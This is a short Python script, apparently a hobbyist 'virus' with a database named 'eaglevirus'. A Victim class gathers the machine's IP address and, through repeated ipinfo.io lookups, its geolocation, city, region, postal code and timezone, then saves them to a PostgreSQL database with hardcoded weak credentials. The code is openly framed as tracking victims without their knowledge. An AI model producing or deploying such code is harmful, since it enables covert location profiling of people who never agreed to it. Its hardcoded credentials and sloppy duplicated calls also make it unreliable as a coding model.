import socket
import sys
import requests
from sqlalchemy import create_engine, Column, Integer, String
from sqlalchemy.orm import sessionmaker
from sqlalchemy.ext.declarative import declarative_base
import psycopg2
Base = declarative_base()

class User(Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    ip = Column(String)
    port = Column(Integer)
    geolocation = Column(String)
    country = Column(String)
    city = Column(String)
    region = Column(String)
    postal = Column(String)
    timezone = Column(String)

engine = create_engine('postgresql://postgres:123456@localhost:5432/eaglevirus')
Base.metadata.create_all(engine)
Session = sessionmaker(bind=engine)
session = Session()

class Victim:
    def __init__(self, ip=None, port=None):
        self.ip = ip
        self.port = port

    def get_user_ip(self):
        hostname = socket.gethostname()
        self.ip = socket.gethostbyname(hostname)
        return self.ip

    def get_user_port(self):
        self.port = 8080
        return self.port
    
    def get_user_geolocation(self):
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data['loc']
    
    def get_user_country(self):
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data['country']
    
    def get_user_city(self):
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data['city']
    
    def get_user_region(self):
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data['region']
    
    def get_user_postal(self):
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data['postal']
    
    def get_user_timezone(self):
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data['timezone']
    
    def save_user_data(self):
        user = User(ip=self.ip, port=self.port, geolocation=self.get_user_geolocation(), country=self.get_user_country(), city=self.get_user_city(), region=self.get_user_region(), postal=self.get_user_postal(), timezone=self.get_user_timezone())
        session.add(user)
        session.commit()

def fuckPc():
    victim = Victim()
    victim.get_user_ip()
    victim.get_user_port()
    victim.save_user_data()
    print("User IP Address: ", victim.ip)
    print("User Port: ", victim.port)
    print("User Geolocation: ", victim.get_user_geolocation())
    print("User Country: ", victim.get_user_country())
    print("User City: ", victim.get_user_city())
    print("User Region: ", victim.get_user_region())
    print("User Timezone: ", victim.get_user_timezone())
    print("User Region: ")
    print(victim.get_user_region())
    print("User Timezone: ")
    print(victim.get_user_timezone())





    
        
    